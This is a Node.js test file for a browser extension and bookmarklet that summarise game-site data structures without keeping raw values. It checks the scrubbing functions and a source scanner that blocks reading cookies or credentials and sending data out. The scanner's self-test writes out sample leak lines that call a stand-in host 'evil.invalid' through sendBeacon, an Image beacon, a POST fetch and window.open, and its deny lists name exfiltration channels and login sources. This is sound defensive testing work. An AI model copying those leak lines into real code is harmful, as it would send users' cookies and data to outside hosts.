// 单测：结构摘要函数 + 源码红线扫描。用法：node --test m0/test/
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import vm from 'node:vm';

const here = dirname(fileURLToPath(import.meta.url));
const read = f => readFileSync(join(here, '..', 'src', f), 'utf8');
const ctx = vm.createContext({ TextEncoder, crypto: globalThis.crypto });
vm.runInContext(read('common.js'), ctx);
const { dfpShape, dfpStrKind, dfpMergeShapes, dfpKindHistogram, dfpScrub, dfpFindItemLike, dfpKeysEqualTo, dfpSafeKey } = ctx;

test('字符串只描述形态，不带内容', () => {
  assert.equal(dfpStrKind('144115219000000001'), 'digits(18)');
  assert.equal(dfpStrKind('8007'), 'digits(4)');
  assert.equal(dfpStrKind('2026-10-25 21:00:00'), 'datetime-str');
  assert.equal(dfpStrKind('20261025'), 'digits(8)');
  assert.equal(dfpStrKind('测试玩家甲'), 'str(5)');
  assert.equal(dfpStrKind('[1,2]'), 'json-str');
  assert.match(dfpStrKind('15080050001,1,1500000#15080050002,1,900000'), /^delim-str\(\d+,sep=,#\)$/);
});

test('结构摘要里没有任何原始值', () => {
  const sample = { role_info: { openid: '144115219000000001', name: '测试玩家甲', level: 42, ratio: 0.5, ok: true, tags: ['a1', 'b2'] } };
  const json = JSON.stringify(dfpShape(sample));
  for (const v of ['144115219000000001', '测试玩家甲', '42', '0.5', 'a1', 'b2']) assert.ok(!json.includes(v), `出现了原始值 ${v}`);
  assert.deepEqual(JSON.parse(json), { role_info: { level: 'int', name: 'str(5)', ok: 'bool', openid: 'digits(18)', ratio: 'float', tags: { 'array[2]': 'str(2)' } } });
});

test('数组元素合并：字段取并集，缺的加问号', () => {
  const merged = dfpMergeShapes([dfpShape({ a: 1, b: 'x' }), dfpShape({ a: 2 })]);
  assert.deepEqual(JSON.parse(JSON.stringify(merged)), { a: 'int', 'b?': 'str(1)' });
  assert.equal(dfpMergeShapes(['int', 'str(1)']), 'int | str(1)');
});

test('ID 形态分布', () => {
  assert.deepEqual(JSON.parse(JSON.stringify(dfpKindHistogram(['144115219000000001', '8007', '8008', undefined]))),
    { 'digits(18)': 1, 'digits(4)': 2, undefined: 1 });
});

test('自检：残留的具体值会被替换并计数', () => {
  const { text, leaked } = dfpScrub('{"x":"144115219000000001","y":"ok"}', new Set(['144115219000000001', 'ab']));
  assert.equal(leaked, 1);
  assert.ok(!text.includes('144115219000000001'));
});

test('自检：昵称恰好是「666」「null」「Get」时，报告仍是合法 JSON，字段名和数字不被误伤', () => {
  const raw = JSON.stringify({ ms: 666, code: null, label: 'GetBattleDetail(sol)', rankpoints: 'int', nick: 'Get' });
  for (const s of ['666', 'null', 'Get', 'int']) {
    const { text } = dfpScrub(raw, new Set([s]));
    const o = JSON.parse(text);   // 不许把 JSON 换坏
    assert.equal(o.ms, 666);
    assert.equal(o.code, null);
    assert.equal(o.label, 'GetBattleDetail(sol)');
    assert.ok('rankpoints' in o);
  }
  assert.equal(JSON.parse(dfpScrub(raw, new Set(['Get'])).text).nick, '[已移除]');
});

test('自检：带引号 / 反斜杠的昵称也能抓到；8 位以上的数字 ID 也能抓到', () => {
  const nick = 'ab"c\\d';
  const { text, leaked } = dfpScrub(JSON.stringify({ x: `${nick}!`, big: 98766432 }), new Set([nick, '98766432']));
  assert.equal(leaked, 2);
  assert.ok(!text.includes('ab\\"c'));
  assert.equal(JSON.parse(text).big, '[已移除]');
});

test('像 ID / 昵称的字段名只留形态', () => {
  assert.equal(dfpSafeKey('friend_openid'), 'friend_openid');
  assert.equal(dfpSafeKey('max_GainedPrice_dtEventTime'), 'max_GainedPrice_dtEventTime');
  assert.equal(dfpSafeKey('144115219000000001'), '<键:digits(18)>');
  assert.equal(dfpSafeKey('测试玩家甲'), '<键:str(5)>');
  const json = JSON.stringify(dfpShape({ m: { '144115219000000001': { k: 1 }, '144115219000000002': { k: 2, j: 'x' } } }));
  assert.ok(!json.includes('1441152190'));
  assert.deepEqual(JSON.parse(json), { m: { '<键:digits(18)>': { k: 'int', 'j?': 'str(1)' } } });
  const hits = dfpFindItemLike({ m: { '测试玩家甲': { redList: [1] } } });
  assert.ok(hits.length && !JSON.stringify(hits).includes('测试玩家甲'));
});

test('找像物品 / 带出的字段，只给结构', () => {
  const hits = dfpFindItemLike({ sol_players: [{ carryOutItems: [{ objectID: 1, price: 2 }], name: '甲' }] });
  assert.ok(hits.some(h => h.path.includes('carryOutItems')));
  assert.ok(!JSON.stringify(hits).includes('甲'));
});

test('找值等于自己 ID 的字段名', () => {
  assert.deepEqual([...dfpKeysEqualTo({ vopenid: '123', other: '9' }, '123')], ['vopenid']);
});

const SOURCES = ['common.js', 'probe-wegame.js'].map(read);   // 验证 B（probe-ams.js）暂缓，已移除
// 去掉注释再查；'https://…'、'//…' 里的 // 不当注释，否则同一行后面的代码整段漏检
const stripComments = src => src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:\\'"`])\/\/[^\n]*/gm, '$1');

/** 红线扫描：源码里不许出现读凭据、往外发数据的写法。违反就抛 AssertionError */
function checkRedline(all) {
  // 其他外发 / 跳转通道一律不许出现；全局对象不许用 [] 动态取属性（document['coo' + 'kie'] 这类绕过）
  for (const bad of ['sendBeacon', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'new Image', 'import(', '.src =', '.action =', 'location.href =', 'location.assign', 'location.replace']) {
    assert.ok(!all.includes(bad), `源码里出现了外发通道 ${bad}`);
  }
  assert.ok(!/\b(window|document|navigator|globalThis|self)\s*\[/.test(all), '不许用 [] 动态取全局属性');
  assert.equal((all.match(/window\.open\(/g) || []).length, 1, 'window.open 只许出现在 dfpHandoff 里');
  // 借官方页面的 Milo 时只许用 emit（现在没有地方用 Milo；以后恢复验证 B 时这条照样管用）
  assert.ok([...all.matchAll(/\b[Mm]ilo\s*\.\s*([A-Za-z_$]+)/g)].every(m => m[1] === 'emit'), 'Milo 只许用 emit');
  assert.deepEqual([...all.matchAll(/dfpCookieFlag\s*\(\s*([^)]*)\)/g)].map(m => m[1].trim()), ['name', "'tgp_user_type'"], 'dfpCookieFlag 只许「定义 + 读 tgp_user_type 一次」，不管用哪种引号');
  // 不许直接读 document.cookie 的值（只允许 common.js 里两个只看名字 / 标记位的函数）
  const cookieUses = all.match(/document\.cookie/g) || [];
  assert.equal(cookieUses.length, 1, 'document.cookie 只能出现在 dfpCookieFlag 里');
  // dfpCookieFlag 只许用来读 tgp_user_type
  const flagCalls = [...all.matchAll(/dfpCookieFlag\('([^']+)'\)/g)].map(m => m[1]);
  assert.deepEqual(flagCalls, ['tgp_user_type']);
  // 不许借官方工具读登录信息
  for (const bad of ['Milo.get(', 'Cookies.get(', 'localStorage.getItem(', 'sessionStorage', 'access_token =', 'tgp_ticket']) {
    assert.ok(!all.includes(bad), `源码里出现了 ${bad}`);
  }
  // 发请求只许用相对路径（同源）或官方的 Milo.emit
  const fetchTargets = [...all.matchAll(/fetch\(([^,]+),/g)].map(m => m[1].trim());
  assert.deepEqual(fetchTargets, ['url']);
  assert.ok(!/fetch\(\s*['"`]https?:/.test(all), '不许 fetch 绝对地址');
}

test('红线：书签源码不碰登录凭据', () => {
  checkRedline(stripComments(SOURCES.join('\n')));
});

test('红线：扩展自己不发请求、不碰 Cookie、不改请求头', () => {
  const ext = ['background.js', 'popup.js', 'site-bridge.js']
    .map(f => stripComments(readFileSync(join(here, '..', 'ext', f), 'utf8'))).join('\n');
  for (const bad of ['fetch(', 'XMLHttpRequest', 'WebSocket', 'sendBeacon', 'document.cookie', 'chrome.cookies', 'webRequest', 'declarativeNetRequest', 'eval(', 'new Function']) {
    assert.ok(!ext.includes(bad), `扩展源码里出现了 ${bad}`);
  }
});

test('扩展正式版：只要官方页面的权限，不含本地模拟环境，不是开发版', () => {
  const dir = join(here, '..', 'dist', 'ext');   // 先跑 node m0/build.mjs
  const m = JSON.parse(readFileSync(join(dir, 'manifest.json'), 'utf8'));
  assert.deepEqual([...m.permissions].sort(), ['scripting', 'storage']);
  assert.deepEqual(m.host_permissions, ['https://www.wegame.com.cn/helper/df/*']);   // 验证 B 暂缓，不再要 df.qq.com
  assert.equal(m.externally_connectable, undefined, '不开放给任意网页直接连');
  assert.deepEqual(m.content_scripts.map(c => c.js), [['site-bridge.js']]);
  const cfg = readFileSync(join(dir, 'config.js'), 'utf8');
  assert.match(cfg, /"dev": false/);
  for (const t of [JSON.stringify(m), cfg]) assert.ok(!t.includes('8770'), '正式版里出现了本地模拟环境');
});

test('红线扫描本身管用：往源码里注入常见的泄漏写法，每一种都要被抓到', () => {
  const injections = [
    "const u = 'https://x.invalid/'; const c = document.cookie;",   // 写在 URL 字符串同一行，以前会被当成注释整段跳过
    'const v = dfpCookieFlag("access_token");',
    "const w = milo.get('openid');",
    "navigator.sendBeacon('https://evil.invalid/c', document.title);",
    "new Image().src = 'https://evil.invalid/?' + 1;",
    "const k = document['coo' + 'kie'];",
    "const x = new XMLHttpRequest();",
    "fetch('https://evil.invalid/', { method: 'POST' });",
    "window.open('https://evil.invalid/');",
  ];
  for (const inj of injections) {
    assert.throws(() => checkRedline(stripComments(SOURCES.join('\n') + '\n' + inj + '\n')), assert.AssertionError, `没抓到：${inj}`);
  }
  // 正常的注释不算违规
  assert.doesNotThrow(() => checkRedline(stripComments(SOURCES.join('\n') + '\n// 这里提一句 document.cookie 和 sendBeacon\n')));
});
